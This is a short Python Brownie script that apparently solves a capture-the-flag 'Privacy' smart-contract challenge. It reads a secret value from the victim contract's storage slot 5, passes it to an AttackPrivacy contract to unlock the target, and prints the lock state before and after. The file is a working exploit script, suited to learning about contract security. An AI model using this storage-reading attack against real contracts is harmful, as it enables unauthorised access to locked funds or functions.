from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Privacy, AttackPrivacy, network, Contract
from web3 import Web3
from web3.auto import w3


def deploy_Privacy(data):
    account = get_account()
    privacy = Privacy.deploy(
        data,
        {"from": account},
    )
    return privacy


def deploy_Attack(victim):
    account = get_account()
    attack = AttackPrivacy.deploy(
        victim,
        {"from": account},
    )
    return attack


def main():
    print(network.show_active())
    account = get_account()
    data = "32 bytes of da".encode("utf-8")  # local test
    # privacy = deploy_Privacy([data, data, data])
    privacy_address = "0x8Cfa32c255B90d51acB6bc0898736E768b0e178D"
    privacy = Contract.from_abi(Privacy._name, privacy_address, Privacy.abi)

    # attack = deploy_Attack(privacy)
    attack = AttackPrivacy[-1]

    print(f"Lock? : {privacy.locked()}")

    # p = w3.eth.get_storage_at(privacy.address, 5)
    p = "0x2f5d7013c513a5e4d672550a4347bb84b3d95118a12aabff965c616a0da0199e"  # from web3.eth.getStorageAt(contract.address, 5) in the browser console

    attack.attack(p, {"from": account})
    print(f"Lock? : {privacy.locked()}")
